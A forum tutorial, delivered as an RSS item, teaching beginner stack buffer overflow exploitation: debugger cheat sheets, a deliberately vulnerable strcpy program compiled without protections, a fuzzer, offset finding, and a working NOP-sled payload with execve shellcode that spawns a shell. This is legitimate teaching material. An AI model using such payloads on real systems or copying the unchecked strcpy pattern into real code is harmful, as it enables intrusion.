<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Getting cozy with exploit development</title>
    <link>https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311</link>
    <description>#### Community Assigned Level:
[poll type=regular]
* Newbie
* Wannabe
* Hacker
* Wizard
* Guru
[/poll]

There won&#39;t be anything groundbreaking in here, and a lot of the content will be sourced from others (properly attributed, mind you).

However, I am going to try to bring a different perspective to the table to bridge the gap I faced *somewhere* in-between where my understanding stopped and the write-ups picked up. This is the path I&#39;ve taken learning the basics of exploit development.

There may be technical inaccuracies as this is my own understanding after 6-months of playing around in memory and doing CTF challenges. Please send any corrections my way.

I&#39;ll be breaking this post up into the following sections:
* [Your Journey Begins](#your-journey-begins)
* [Processors and Weird Machines](#processors-and-weird-machines)
* [Tools of the trade](#tools-of-the-trade)
* [Setting up your environment](#setting-up-your-environment)
* [The Instruction Pointer](#the-instruction-pointer)
* [Fuzzing](#fuzzing)
* [Observing a crash](#observing-a-crash)
* [Dancing around in memory](#dancing-around-in-memory)
* [Putting it all together](#putting-it-all-together)
* [Practice makes slightly better](#practice-makes-slightly-better)

&lt;a name=&quot;your-journey-begins&quot;&gt;&lt;/a&gt;
## Your Journey Begins
We&#39;ll start with the basics, these are things you should read before you begin your journey. Don&#39;t worry if you don&#39;t grasp the entirety of the knowledge shared by these authors, but try to look at the graphs and read the posts and *start* thinking about it. Having a small foundation to build on will help you out greatly when it comes time to get lost sifting through memory.

First, a basic understanding of assembly is necessary to be able to make sense of what we&#39;re going to be doing. Let&#39;s watch a crash course on x86 assembly by [HackUCF](https://hackucf.org/blog/)
https://www.youtube.com/watch?v=75gBFiFtAb8

### Further Reading
[Buffer Overflow Attacks: Detect, Exploit, Prevent](https://www.amazon.com/Buffer-Overflow-Attacks-Exploit-Prevent/dp/1932266674)
This is probably the greatest book for beginners on the subject I&#39;ve ever read. It not only gives you unique perspectives on how the exploits work but also is full of history and examples.

[SkullSecurity - Assembly Language Tutorial](https://wiki.skullsecurity.org/index.php?title=Fundamentals)
This is probably one of the greatest and least terrifying introductions to assembly I have ever read. It&#39;s what got me on track to beginning to understand the building blocks of computer systems. Reading through each section a few times, will leave you feeling a lot more confident in what you&#39;re about to embark on.

[Many But Finite - Anatomy of a Program in Memory](https://manybutfinite.com/post/anatomy-of-a-program-in-memory/)
This post is great as a first deep look into how memory works. I find that in order to successfully build exploits we almost have to undergo a perceptual switch in which we can really think in the context of a program running in memory. 

[Many But Finite - Journey to the Stack](https://manybutfinite.com/post/journey-to-the-stack/)
Of course, when it comes to exploit development there is a lot of work to be done in the stack, this post is that deep dive into how the stack actually works. You really need to get an understanding of how a stack frame is built if you want to build fake stack frames.

[Many But Finite - Epilogues, Canaries, and Buffer Overflows](https://manybutfinite.com/post/epilogues-canaries-buffer-overflows/)
This is a great post for detailing how a buffer overflow occurs and begins to touch on the idea of security mechanisms we may encounter on our journeys.

&lt;a name=&quot;processors-and-weird-machines&quot;&gt;&lt;/a&gt;
## Processors and Weird Machines
[From Buffer Overflows to “Weird Machines” and Theory of Computation](http://langsec.org/papers/Bratus.pdf)
This really helped me bridge that gap of understanding what we were doing when we exploited a buffer overflow. We are literally creating weird machines out of systems, allowing us to build our own systems within systems. In some cases you can even achieve Turing completeness through these weird machines.

[Weird Machines, Exploitability, and provable non-exploitability](https://docs.google.com/presentation/d/1lfQGEX2aGEA1H7flsXw4V30ZkbnrfikYk9IrctuwZO8)
I recently stumbled upon this slideshow by [Thomas Dullien](https://twitter.com/halvarflake) which discusses this very concept. The key takeaway from these slides for me was that it&#39;s easy to teach someone how to overwrite the instruction pointer and jump to a bit of attacker controlled memory. However, what does that *really* teach someone? Can they apply it in a slightly, or perhaps wildly, different scenario? Probably not.

He defines weird machines *really* well. As the exploit developer, you are exploring what you can do with these weird machines. Much like programming, you have to be able to troubleshoot and debug your code and you have to be able to visualize your exploit in memory to properly understand what you are doing.

#### Breaking the x86 Instruction Set
https://www.youtube.com/watch?v=KrksBdWcZgQ

This video does a great job of explaining why there is a fundamental problem with the processor and why we cannot solve the problem with software alone. You don&#39;t have to watch the whole thing now, however, I would recommend coming back to it when you&#39;ve gained a bit of a better understanding.

The key takeaway here is that cpu&#39;s inherently trust everything you tell them to do, and with a trust-model like this it&#39;s no wonder that achieving malicious code execution is so trivial. Software intends to define a logic set that implements memory protections to stop such attacks. However, at the end of the day all it takes is one mistake in an incredibly complex system to make it past those protections and for the cpu to happily run your code. That&#39;s its job, after all.

&lt;a name=&quot;tools-of-the-trade&quot;&gt;&lt;/a&gt;
## Tools of the trade
Before we go on, let&#39;s talk about some tools that you&#39;ll likely want to have at your disposal. There are loads of different tools out there for assisting in reverse engineering and exploit development, I&#39;d recommend you explore them all.

This video by [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w) goes over a lot of different command line tools as well as feature rich debuggers such as file, strings, ltrace, strace, objdump, hopper, and radare2. Consider this a primer.

https://www.youtube.com/watch?v=3NTXFUxcKPc

Below are some quick cheatsheets on using some of the tools I find to be the most useful in building exploits.
### Immunity Debugger
```
Breakpoint: F2
Step: F7
Exec till Return: Ctrl+F9
Run: F9
Pause: F12
```
### mona.py
```
config [option] [value] - set configuration
pc [size] - generate cyclic pattern
po [address] - find offset
findmsp - find register overwritten with pattern
bytearray -b [badchars] - generate bytes from 0x00 to 0xff excluding badchars
jmp -r [register] - find a jump point
-n - skip modules that start with 0x00
-o - skip os modules
-m - module
-cm - module property
-cpd - filter bad chars
```
### WinDBG
```
# Shortcuts
Open Executable: CTRL+E
Attach to process: F6
Memory: Alt+5
Close Window: Ctrl+F4
Restart: Ctrl+Shift+F5
Break: Ctrl+Break

# Commands
g - pass exception
gN - step
bp [address] - breakpoint
bl - list breakpoints
!exchain - view exception chain
.load pykd.pyd - load python
!py mona [command] [args] - exceute mona stuff
a -&gt; [jmp address]
u [address] - inspect
u - view stack
t - step
```
### gdb
```
disas - disassemble
b - breakpoint
c - continue
r - run
p - print address
st - step
x - examine
  x/s - examine string
  x/n - examine n entries
i r - info registers
i proc m - info proc map
define hook - build a hook to call under conditions
vm - virtual memory
si - step instruction (follow jumps)
ni - next instruction
```
### Other Tools
There are other *very* useful tools, you can google them.

IDA Pro
gdb-peda
pwntools
x64dbg
ollydbg

&lt;a name=&quot;setting-up-your-environment&quot;&gt;&lt;/a&gt;
## Setting up your environment

When you run gdb it does a few things to setup its environment that will make it slightly different from your terminal&#39;s environment. This will cause issues dealing with memory addresses because environmental variables wind up in the memory space of our running program.

In order to cause the least amount of headaches try adding these commands to your ```.gdbinit``` file.
```bash
bash -c &quot;echo &#39;unset env LINES&#39; &gt;&gt; .gdbinit&quot;
bash -c &quot;echo &#39;unset env COLUMNS&#39; &gt;&gt; .gdbinit&quot;
```

This will align your memory in gdb with your normal shell. Otherwise the return address you use to jump to your shellcode won&#39;t be the same in gdb as it is in your terminal. This will stop your shell from running outside of gdb.

Lastly, we&#39;ll disable ``ASLR``. Also check to make sure it&#39;s been disabled (0 = disabled).
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
0
```

Alright with that out of the way we can get started!

&lt;a name=&quot;the-instruction-pointer&quot;&gt;&lt;/a&gt;
## The Instruction Pointer
The instruction pointer as you probably know by now is the most important pointer for developing a basic stack-based exploit. Luckily these days gaining control of this pointer isn&#39;t enough to gain code execution, but it&#39;s still very important to understand *how* to gain control of pointers before you can move onto more complex topics.

Generally, the concept is very simple, you find out how to supply data to the input you suspect is vulnerable. Throw data at it until you observe a crash. You can then use the metasploit-framework to build out a unique pattern and then analyze the overwritten Instruction Pointer to determine the exact offset to overwrite it.

Here is a great video for first visualizing a buffer overflow:

https://www.youtube.com/watch?v=1S0aBV-Waeo

It&#39;s the first video I watched and I honestly still go back to it from time to time. I find as I gain more knowledge in this area, my understanding of simple concepts grows dramatically. For example, the way I visualized a stack 6 months ago versus the way I visualize it now are worlds apart.

&lt;a name=&quot;fuzzing&quot;&gt;&lt;/a&gt;
## Fuzzing
There are plenty of ways to fuzz an application for a crash, in addition to this there are a lot of different ways a user can interact with the input of an application. You have to think about this in order to understand how to build a fuzzing tool. For example, if you are supplying data from stdin, your fuzzer will operate slightly differently than if you&#39;re sending the data in an http get request to a webserver.

There is also great tooling for Fuzzing applications you should explore, however for the purposes of this post we will be taking a manual approach. If you&#39;re interested in Fuzzing tools check out [Sulley](https://github.com/OpenRCE/sulley).

Since we are going to keep it simple for the sake of this post, consider the following vulnerable program, which takes user input as a command line argument.
```
#include &lt;string.h&gt;
int main(int argc, char *argv[])
{
    char buff[256];
    strcpy(buff, argv[1]);
    return 0;
}
```

Compiled with
```
gcc -o test test.c -m32 -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
```

In order to fuzz certain parts of a binary you may have to reverse engineer the steps required to get to the specific input to fuzz before you can automate throwing your fuzz data at it. However, in this instance we are *trying* to keep it simple. So let&#39;s just jump in and build our fuzzer:
```
#!/usr/bin/python
import subprocess, sys
# How many bytes do we wanna set as our maximum
MAX_BYTES = 300
# How many bytes to increment each attempt by
SEED_BYTES = 1
# Default buffer
BUFFER = &quot;A&quot;
while len(BUFFER) &lt;= MAX_BYTES:
    command = [&quot;./test {}&quot;.format(BUFFER)]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    print &quot;[x] Throwing {} bytes...&quot;.format(len(BUFFER))
    if process.stderr.read() == &quot;Segmentation fault\n&quot;:
        # Segfault was reached, we crashed at len(BUFFER)
        print &quot;[!] Crashed with {} bytes.&quot;.format(len(BUFFER))
        sys.exit()
    # Increment our Bufffer by SEED_BYTES
    BUFFER += &quot;A&quot; * SEED_BYTES
```

&lt;a name=&quot;observing-a-crash&quot;&gt;&lt;/a&gt;
## Observing a crash
In some instances, you may want to open gdb or whatever debugger you are using and observe the crash by opening the executable before fuzzing or attaching to an already running process. For this example, we&#39;re just going to run our fuzzer first.

Fuzz the input with our python script
```
➜  python test.py
[x] Throwing 1 bytes...
[x] Throwing 2 bytes...
--skip a few---
[!] Crashed with 256 bytes.
```

Great so we know the program crashes at ```256-bytes```, which makes sense because we were creating a buffer of ```256-bytes``` in the C program, and then using ```strcpy``` to copy ```argv[1]``` into that buffer. It crashes when it runs into a situation where it has nothing to do.

For example, if you overwrite the Instruction Pointer with A&#39;s or ```0x41414141```, it will crash when it tries to jump to that address because there is no ```0x41414141``` in memory. Knowing this, we can create an exploit that works within the ```256-bytes``` that we have control over, if we exceed that we will overwrite some arbitrary memory and cause a crash.

We may also cause a crash by writing less than ```256-bytes```. For example, if we find an offset to overwrite ```EIP```, but don&#39;t pad the right side to equal a total of ```256-bytes``` It&#39;s possible that ```EIP``` won&#39;t be overwritten with the value we think because ```EIP``` itself is an offset. That padding will allow us to align our ```EIP``` so that it is read as we intend it. Remember earlier when we talked about exploring as an exploit developer? This is part of that process.

&lt;a name=&quot;dancing-around-in-memory&quot;&gt;&lt;/a&gt;
## Dancing around in memory
Before we focus on controling ```EIP```, lets run through our assembly. There is a great tool we can use to get comfortable with it at [godbolt](https://godbolt.org/).

![Getting cozy with exploit development - godbolt](//0x00sec.s3.amazonaws.com/original/2X/b/b917498f05e67b2d7ea8622f6cf6f64a278a1af8.png)

Explore it, get used to looking at it, we&#39;re going to be spending a lot of time disassembling functions.

Alright, let&#39;s get started by creating a pattern of ```256-bytes``` using the metasploit-framework&#39;s ```pattern_create```.
```bash
➜  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 256       
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A
```

Using this pattern let&#39;s observe the crash in gdb. First open the program with gdb, then we run the program with our pattern.
```bash
gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A
Starting program: /home/dostoevsky/example/test Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A

Program received signal SIGSEGV, Segmentation fault.
```

Notice we hit our Segmentation fault, here is what our registers look like, you&#39;ll see that part of our pattern flows into ```ESP``` and ```ECX``` points to ```ESP```, and that our ```EIP``` gets overwritten as ```Ad6A``` or ```0x41366441```
```bash
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd000 (&quot;d7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A&quot;)
EDX: 0xffffd08e --&gt; 0xd0004134 
ESI: 0xf7f9a000 --&gt; 0x1cfd70 
EDI: 0x0 
EBP: 0x0 
ESP: 0xffffd000 (&quot;d7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A&quot;)
EIP: 0x41366441 (&#39;Ad6A&#39;)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
```

A full look at our stack
```bash
[------------------------------------stack-------------------------------------]
0000| 0xffffd000 (&quot;d7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A&quot;)
0004| 0xffffd004 (&quot;8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A&quot;)
0008| 0xffffd008 (&quot;Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A&quot;)
0012| 0xffffd00c (&quot;e1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A&quot;)
0016| 0xffffd010 (&quot;2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A&quot;)
0020| 0xffffd014 (&quot;Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A&quot;)
0024| 0xffffd018 (&quot;e5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A&quot;)
0028| 0xffffd01c (&quot;6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A&quot;)
```

This is because we threw a pattern that filled up our buffer at our vulnerable program. You can determine the exact offset to overwrite ```EIP``` using metasploit-framework&#39;s ```pattern_offset```
```
➜  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41366441
[*] Exact match at offset 108
```

Okay, so now we should be able to gain control of ```EIP``` with ```108-bytes```, the next ```4-bytes``` will overwrite ```EIP```, and the remaining ```144-bytes``` after that should be padded to fill up our buffer (causing our program to crash). Our exploit will be in the order of ```[108-bytes][EIP][Padding]```.

Our padding is easy to calculate. We just take our ```crash point - offset - EIP == 144``` and then multiply them by our padding character, in this case, we&#39;ll use &quot;C&quot; or ```0x43434343```. Here&#39;s a visualization of what our exploit order will look like

![Getting cozy with exploit development](//0x00sec.s3.amazonaws.com/original/2X/6/67e6030225d75b0192e20cabfbf2751963724c92.png)

Let&#39;s give it a try!
```
gdb-peda$ r `python -c &quot;print &#39;A&#39; * 108 + &#39;BBBB&#39; + &#39;C&#39; * (256 - 108 - 4)&quot;`
Starting program: /home/dostoevsky/example/test `python -c &quot;print &#39;A&#39; * 108 + &#39;BBBB&#39; + &#39;C&#39; * (256 - 108 - 4)&quot;`

Program received signal SIGSEGV, Segmentation fault.
```

And as you can see we hit our Segmentation fault and our ```EIP``` is overwritten with ```0x42424242``` or ```BBBB```, which is what we wanted. You also notice that ```ESP``` gets overwritten with our 144 C&#39;s. This is because we padded the right side of our exploit to fill up the full ```256-bytes``` with ```&quot;C&quot; * ( 256 - 108 - 4)``` which equals 144.
```
Program received signal SIGSEGV, Segmentation fault
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd000 (&#39;C&#39; &lt;repeats 144 times&gt;)
EDX: 0xffffd08e --&gt; 0xd0004343 
ESI: 0xf7f9a000 --&gt; 0x1cfd70 
EDI: 0x0 
EBP: 0x0 
ESP: 0xffffd000 (&#39;C&#39; &lt;repeats 144 times&gt;)
EIP: 0x42424242 (&#39;BBBB&#39;)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
```

And oberving our stack, we have our 144 C&#39;s starting
```
[------------------------------------stack-------------------------------------]
0000| 0xffffd000 (&#39;C&#39; &lt;repeats 144 times&gt;)
0004| 0xffffd004 (&#39;C&#39; &lt;repeats 140 times&gt;)
0008| 0xffffd008 (&#39;C&#39; &lt;repeats 136 times&gt;)
0012| 0xffffd00c (&#39;C&#39; &lt;repeats 132 times&gt;)
0016| 0xffffd010 (&#39;C&#39; &lt;repeats 128 times&gt;)
0020| 0xffffd014 (&#39;C&#39; &lt;repeats 124 times&gt;)
0024| 0xffffd018 (&#39;C&#39; &lt;repeats 120 times&gt;)
0028| 0xffffd01c (&#39;C&#39; &lt;repeats 116 times&gt;)
```

Great so we&#39;ve gained control of ```EIP``` evidenced by it being set to ```0x42424242```, all we need to do now is execute some code. You&#39;ll notice that the space we determined the size of after our overwritten ```EIP``` is only going to allow us ```144-bytes``` to work with. To be clear this is the start of our ```ESP``` (extended stack pointer) which points to the top of our stack, however, keep in mind the stack grows towards lower memory.

To get an idea of the layout in memory you can use ```info proc m``` or ```vm```
```
gdb-peda$ info proc map
process 70832
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/dostoevsky/example/test
	 0x8049000  0x804a000     0x1000        0x0 /home/dostoevsky/example/test
	0xf7dca000 0xf7f97000   0x1cd000        0x0 /lib32/libc-2.26.so
	0xf7f97000 0xf7f98000     0x1000   0x1cd000 /lib32/libc-2.26.so
	0xf7f98000 0xf7f9a000     0x2000   0x1cd000 /lib32/libc-2.26.so
	0xf7f9a000 0xf7f9b000     0x1000   0x1cf000 /lib32/libc-2.26.so
	0xf7f9b000 0xf7f9e000     0x3000        0x0 
	0xf7fd0000 0xf7fd2000     0x2000        0x0 
	0xf7fd2000 0xf7fd5000     0x3000        0x0 [vvar]
	0xf7fd5000 0xf7fd7000     0x2000        0x0 [vdso]
	0xf7fd7000 0xf7ffc000    0x25000        0x0 /lib32/ld-2.26.so
	0xf7ffc000 0xf7ffd000     0x1000    0x24000 /lib32/ld-2.26.so
	0xf7ffd000 0xf7ffe000     0x1000    0x25000 /lib32/ld-2.26.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

Since we have 144-bytes to work with in our buffer, we will write our shellcode here. For this reason we will jump to the start of ```ESP```, and as we know the instruction pointer points to the next address in memory to jump and execute. So, we will point it to our ```ESP``` (the start of our &quot;C&quot;s) 
```
gdb-peda$ x $esp
0xffffd000:	&#39;C&#39; &lt;repeats 144 times&gt;
```

However, this is using ```0x00``` which is generally used for string termination and will be considered a bad character. You can learn more about bad characters in the write-up by [ch3rn0byl](http://ch3rn0byl.com) linked in the [practice](#practice-makes-slightly-better) section later.

Luckily, we have ```144-bytes``` to work with so giving up ```1-byte``` isn&#39;t a big deal.
```
gdb-peda$ x $esp+1
0xffffd001:	&#39;C&#39; &lt;repeats 143 times&gt;
```
Let&#39;s try it out using the ```\xCC``` trap instruction, and our return address of ```0xffffd001```. First let&#39;s put it in little-endian notation: ```\x01\xd0\xff\xff```. Essentially the trap instruction will halt our execution but let us know code execution is possible if it falls into the trap.
```
gdb-peda$ r `python -c &quot;print &#39;A&#39; * 108 + &#39;\x01\xd0\xff\xff&#39; + &#39;\xCC&#39; * (256 - 108 - 4)&quot;`
Starting program: /home/dostoevsky/example/test `python -c &quot;print &#39;A&#39; * 108 + &#39;\x01\xd0\xff\xff&#39; + &#39;\xCC&#39; * (256 - 108 - 4)&quot;`

Program received signal SIGTRAP, Trace/breakpoint trap.
```

Great so we hit our SIGTRAP, and our registers look like this, notice ```ECX```, ```ESP```, and ```EIP``` point to ```0xcccccccc```. Also notice that ```EIP``` is set to our ```0xffffd002```, it jumped to our ```EIP``` of ```0xffffd001``` and then fell into our trap of ```0xCC```.
```
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd000 --&gt; 0xcccccccc 
EDX: 0xffffd08e --&gt; 0xd000cccc 
ESI: 0xf7f9a000 --&gt; 0x1cfd70 
EDI: 0x0 
EBP: 0x0 
ESP: 0xffffd000 --&gt; 0xcccccccc 
EIP: 0xffffd002 --&gt; 0xcccccccc
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
```

Lastly, our stack layout now looks like this
```
[------------------------------------stack-------------------------------------]
0000| 0xffffd000 --&gt; 0xcccccccc 
0004| 0xffffd004 --&gt; 0xcccccccc 
0008| 0xffffd008 --&gt; 0xcccccccc 
0012| 0xffffd00c --&gt; 0xcccccccc 
0016| 0xffffd010 --&gt; 0xcccccccc 
0020| 0xffffd014 --&gt; 0xcccccccc 
0024| 0xffffd018 --&gt; 0xcccccccc 
0028| 0xffffd01c --&gt; 0xcccccccc 
```

```
Note: Never use shellcode if you don&#39;t know what it does.
```
Great so we know code execution is possible, and we know that we have ```143-bytes``` to work with. We can just use [this](http://shell-storm.org/shellcode/files/shellcode-61.php) short payload of only ```28-bytes``` from shell-storm:
```
\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80
```

Now, we need to figure out where to put this.

&lt;a name=&quot;putting-it-all-together&quot;&gt;&lt;/a&gt;
## Putting it all together
Now, all we need to do is jump to this address and replace our traps with our shellcode.

We need to fill up this buffer with padding so that the shell code takes up ```28-bytes``` and the padding takes up the remaining ```144-bytes``` just like we did with our trap earlier. Remember the math for this padding is ```256 (buffer) - 108 (offset) - 4 (EIP) - 28 (shellcode)```. This will be fairly easy to construct, first we will use a concept referred to as a nopsled to slide into our shellcode, we&#39;ll fill up the start of our space with ```\0x90``` (no operations) and when we jump to it, our stack will just jump over each ```NOP``` until it hits our shellcode. It will be something in the order of ```[Buffer][EIP][NOPSled][Shellcode]```, where our nopsled and shellcode act as our padding. It will look like this:

![Getting cozy with exploit development](//0x00sec.s3.amazonaws.com/original/2X/8/8284aa24db0afa7f32e479280ee4c82510fbdea3.png)

Let&#39;s try it out!
```
gdb-peda$ r `python -c &quot;print &#39;A&#39; * 108 + &#39;\x01\xd0\xff\xff&#39; + &#39;\x90&#39; * (256 - 108 - 4 - 28) + &#39;\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80&#39;&quot;`
Starting program: /home/dostoevsky/example/test `python -c &quot;print &#39;A&#39; * 108 + &#39;\x01\xd0\xff\xff&#39; + &#39;\x90&#39; * (256 - 108 - 4 - 28) + &#39;\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80&#39;&quot;`
process 70842 is executing new program: /bin/dash
$ id
[New process 70844]
process 70844 is executing new program: /usr/bin/id
uid=1000(dostoevsky) gid=1000(dostoevsky) groups=1000(dostoevsky),27(sudo)
```

Great it works in ```gdb```! Now let&#39;s try to run it on our command line to make sure everything lines up correctly.
```
➜  ./test `python -c &quot;print &#39;A&#39; * 108 + &#39;\x01\xd0\xff\xff&#39; + &#39;\x90&#39; * (256 - 108 - 4 - 28) + &#39;\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80&#39;&quot;`
[1]    70865 segmentation fault  ./test 
```

Notice it fails if we try to run it, this is because of those environmental variables we mentioned earlier. In gdb the environmental variables it sets use the full path to the binary, even if you don&#39;t supply it, so here we must also use the full path to make everything line up in memory.

You can observe the difference in the arguments (remember the command we run is also an argument within bash) by using ```strace```:
```
➜  strace ./test
execve(&quot;./test&quot;, [&quot;./test&quot;], 0x7fffffffe120 /* 52 vars */) = 0
```

versus

```
➜  strace /home/dostoevsky/example/test
execve(&quot;/home/dostoevsky/example/test&quot;, [&quot;/home/dostoevsky/example/test&quot;], 0x7fffffffe110 /* 52 vars */) = 0
```

So let&#39;s try that again with the full path:
```
➜  /home/dostoevsky/example/test `python -c &quot;print &#39;A&#39; * 108 + &#39;\x01\xd0\xff\xff&#39; + &#39;\x90&#39; * (256 - 108 - 4 - 28) + &#39;\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80&#39;&quot;`
$ id
uid=1000(dostoevsky) gid=1000(dostoevsky) groups=1000(dostoevsky),27(sudo)
```

And voila, just like that we have code execution like its 1999 again! Obviously, in modern exploitation, there has been significant advances in memory protections. 
Therefore, this approach *should* no longer be possible.

However, hopefully you have gained some insight of how this all works. This will make adapting to different scenarios and environments easier.

&lt;a name=&quot;practice-makes-slightly-better&quot;&gt;&lt;/a&gt;
## Practice makes slightly better
One of my favorite quotes is by Isaac Newton where he said:
&gt; If I have seen further it is by standing on ye sholders of Giants

This couldn&#39;t be truer of exploit development, we are able to continue research and advance our techniques because the experts before us were kind enough to share their research and give us a boost to the high chair. We are but children in this field, respect that, put in the work and it will pay off.

Essentially you need to learn how to dance around in memory, there is no better way to do this than to just get your hands dirty.

Practice these basic concepts using some of these write-ups, but in addition to that just jump in your debugger and move around memory until you understand what is going on.

